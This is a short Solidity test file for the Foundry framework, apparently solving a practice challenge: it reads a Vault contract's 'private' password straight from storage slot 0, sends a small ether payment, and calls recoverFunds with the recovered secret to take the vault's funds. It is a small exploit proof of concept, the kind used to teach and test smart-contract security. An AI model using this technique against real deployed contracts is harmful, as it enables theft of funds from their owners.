// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.11;

import "forge-std/console.sol";
import "forge-std/Test.sol";
import "../src/Vault.sol";


interface CheatCodes {
        function record() external;
        function load(address account, bytes32 slot) external returns (bytes32);
}


contract VaultTest is Test {
    Vault public vault;
    address public bob;


    function setUp() public {
        vault = new Vault{value: 0.0001 ether}();
    }


    function testFindThePassword() public {

        bob = makeAddr("bob");
        vm.startPrank(bob);
        vm.deal(bob, 10 ether);

        bytes32 secret = vm.load(address(vault), bytes32(uint256(0)));

        (bool sent2, ) = address(vault).call{value: 0.0001 ether}("");
        require(sent2, "Fail ether transfer");
        vault.recoverFunds(uint256(secret));
    }

    fallback() external payable {

    }


}
